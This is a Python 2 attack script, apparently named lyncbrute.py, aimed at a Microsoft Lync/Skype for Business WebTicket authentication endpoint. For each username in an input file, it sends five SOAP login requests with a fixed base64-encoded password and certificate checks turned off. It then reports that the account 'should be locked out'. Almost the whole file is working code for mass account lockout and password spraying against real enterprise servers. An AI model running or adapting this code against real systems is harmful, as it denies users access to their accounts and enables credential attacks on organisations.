#!/usr/bin/python

#import urllib2
#import ssl

import sys, getopt, os, base64, time

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def post_xml(userid):
   xml_data = """<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Header><Security s:mustUnderstand="1" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"><UsernameToken><Username>%s</Username><Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">U3VtbWVyMjAxNg==</Password></UsernameToken></Security></s:Header><s:Body><RequestSecurityToken xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Context="ec86f904-154f-0597-3dee-59eb1b51e731" xmlns="http://docs.oasis-open.org/ws-sx/ws-trust/200512"><TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType><RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType><AppliesTo xmlns="http://schemas.xmlsoap.org/ws/2004/09/policy"><EndpointReference xmlns="http://www.w3.org/2005/08/addressing"><Address>https://2013-lync-fe.contoso.com/WebTicket/WebTicketService.svc/Auth</Address></EndpointReference></AppliesTo><Lifetime><Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">2016-06-07T02:23:36Z</Created><Expires xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">2016-06-07T02:38:36Z</Expires></Lifetime><KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>"""%(userid)
   return xml_data



###############################################################################
# # # # # # # # # # # # # # # # # #    MAIN    # # # # # # # # # # # # # # # #
###############################################################################

# Store input and output file names
ifile=''
ofile=''
domain=''
target=''
 
# Read command line args
myopts, args = getopt.getopt(sys.argv[1:],"t:i:o:d:")

if len(myopts) == 0:
    print "usage: ./lyncbrute.py -t <target> -d <domain> -i <inputfile> -o <outputfile>"
    sys.exit()
 
for o, a in myopts:
    if o == '-t':
        target=a
    elif o == '-i':
        ifile=a
    elif o == '-o':
        ofile=a
    elif o == '-d':
	domain=a
    else:
        print("Usage: %s -t target_ip -i inputfile -o outputfile -d domain" % sys.argv[0])
 
inputfilepath = ((os.path.dirname(os.path.abspath(__file__))) + "/%s") % ifile

targeturl = "https://%s/WebTicket/WebTicketService.svc/Auth" % target



# DEBUG: print our variables that have been passed
print "Target is %s" % target
print "Targeturl is %s" %targeturl
print "Input file path is %s" % inputfilepath
print "ifile is %s" %ifile
#print "ofile is %s" %ofile
print "domain is %s" %domain

with open(inputfilepath) as parsedfile:
    data = {}
    lines = (line.rstrip() for line in parsedfile)
    lines = (line for line in lines if line)

    for line in lines:

	tmpusername = "%s\\%s" % (domain, line)

	b64username = base64.b64encode(tmpusername.encode('ascii') )

	headers = {'Content-Type': 'text/xml; charset=utf-8'}
	xml_data = post_xml(b64username)


	try:
		print "Sending request 1"
		lyncposttime = requests.post(targeturl, data=xml_data, headers=headers, verify=False).elapsed.total_seconds()
		print "Sending request 2"
		lyncposttime = requests.post(targeturl, data=xml_data, headers=headers, verify=False).elapsed.total_seconds()
		print "Sending request 3"
		lyncposttime = requests.post(targeturl, data=xml_data, headers=headers, verify=False).elapsed.total_seconds()
		print "Sending request 4"
		lyncposttime = requests.post(targeturl, data=xml_data, headers=headers, verify=False).elapsed.total_seconds()
		print "Sending request 5"
		lyncposttime = requests.post(targeturl, data=xml_data, headers=headers, verify=False).elapsed.total_seconds()
		print "Account should be locked out (5 failed attempts)."

# this one has timeout set
#		lyncposttime = requests.post(targeturl, data=xml_data, headers=headers, verify=False, timeout=1).elapsed.total_seconds()
#		print "Total time for %s was %s" % (tmpusername, lyncposttime)

	except:
		print "MAX TIMEOUT REACHED for %s" % tmpusername

